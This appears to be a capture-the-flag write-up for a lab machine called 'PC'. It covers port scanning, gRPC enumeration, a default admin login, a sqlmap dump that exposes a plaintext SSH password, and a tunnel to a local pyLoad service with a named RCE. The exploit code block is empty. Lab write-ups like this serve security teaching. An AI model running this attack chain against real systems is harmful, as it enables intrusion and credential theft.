# PC

```
\u276f sudo nmap 10.10.11.214 -sS -oA sync -p- --disable-arp-ping -Pn -n
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 20:22 CEST
Nmap scan report for 10.10.11.214
Host is up (0.015s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 111.44 seconds
```

Doing some service discovery on port 50051 gives

```
\u276f nmap 10.10.11.214 -sV -p50051 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 20:26 CEST
Nmap scan report for 10.10.11.214
Host is up (0.016s latency).

PORT      STATE SERVICE VERSION
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=9/22%Time=650DDC54%P=x86_64-redhat-linux-gnu
SF:%r(NULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Gen
SF:ericLines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xf
SF:f\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(G
SF:etRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xf
SF:f\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(H
SF:TTPOptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\x
SF:ff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(
SF:RTSPRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\
SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r
SF:(RPCCheck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xf
SF:f\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(D
SF:NSVersionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\
SF:0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?
SF:\0\0")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\x
SF:ff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\
SF:0\0\0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x
SF:05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\
SF:0\?\0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\
SF:0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0
SF:\0\0\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\
SF:?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x
SF:08\0\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04
SF:\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x0
SF:4\x08\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0
SF:\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\
SF:x08\0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0
SF:\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\
SF:x08\0\0\0\0\0\0\?\0\0");
```

`curl http://10.10.11.214:50051` returns the error `HTTP/0.9 Received when not allowed`.

# GRPC

After some googling i found out that port `50051` is the default port for GRPC.

```bash
\u276f grpc_cli ls $TARGET
SimpleApp
grpc.reflection.v1alpha.ServerReflection


\u276f grpc_cli ls $TARGET SimpleApp -l
filename: app.proto
service SimpleApp {
  rpc LoginUser(LoginUserRequest) returns (LoginUserResponse) {}
  rpc RegisterUser(RegisterUserRequest) returns (RegisterUserResponse) {}
  rpc getInfo(getInfoRequest) returns (getInfoResponse) {}
}

\u276f grpc_cli type $TARGET RegisterUserRequest # Same for LoginUserRequest
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}

```

### Admin:Admin

Requesting the login user call with `admin:admin` returns a token.

```
\u276f grpc_cli call $TARGET SimpleApp.LoginUser "username: 'admin', password: 'admin'"
connecting to 10.10.11.214:50051
message: "Your id is 647."
Received trailing metadata from server:
token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTU0MjEyOTl9.uCIscEFZVH8EYf7b43YuSyhbBaDPoN2rht4Javu8qa4'
Rpc succeeded with OK status
```

Parsing the token we get 
```
\u276f echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9' | base64 -d
{"typ":"JWT","alg":"HS256"}%

~
\u276f echo 'eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTU0MjEyOTl9' | base64 -d
{"user_id":"admin","exp":1695421299}%
```

# Get info

There is one other request that might be useful `getInfo`. It looks like this
call throws errors when non-valid data is passed so this might be an in via
sqlmap. Capturing the request with `grpcui` and `burpsuite` it is possible to
give this to `sqlmap`. It seems we have an in and we can dump all the data :D

```bash
\u276f python /opt/sqlmap/sqlmap.py -r sql --batch --dbms sqlite --dump
```

# Parsing the database

The `accounts` table is the most interesting. This contains

```
password,username
admin,admin
HereIsYourPassWord1431,sau
```

Checking for password reuse on ssh
```
\u276f ssh sau@10.10.11.214
sau@10.10.11.214's password:
Permission denied, please try again.
sau@10.10.11.214's password:
Last login: Fri Sep 22 17:56:03 2023 from 10.10.16.81
-bash-5.0$
```

### Additional ports

With netstat some additional ports are found 

```
-bash-5.0$ netstat -auntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp        1      0 127.0.0.1:8000          127.0.0.1:43644         CLOSE_WAIT  -
tcp        0      0 10.10.11.214:59288      10.10.14.127:1337       CLOSE_WAIT  -
tcp        0    432 10.10.11.214:22         10.10.14.119:52268      ESTABLISHED -
tcp        0      0 10.10.11.214:41266      10.10.14.127:1337       CLOSE_WAIT  -
tcp        1      0 127.0.0.1:8000          127.0.0.1:53696         CLOSE_WAIT  -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::50051                :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

We can set up an ssh tunnel to access port 8000 
```
ssh -L 1234:localhost:8000 sau@10.10.11.214
sau@10.10.11.214's password:
Last login: Fri Sep 22 20:35:43 2023 from 10.10.14.119
```

Accessing port 8000 (_localhost:1234_) in the browser an interface for pyload is
shown. Searching for a CVE results in an RCE that can be used.

Updating this CV for our own use case we get:
```bash

```
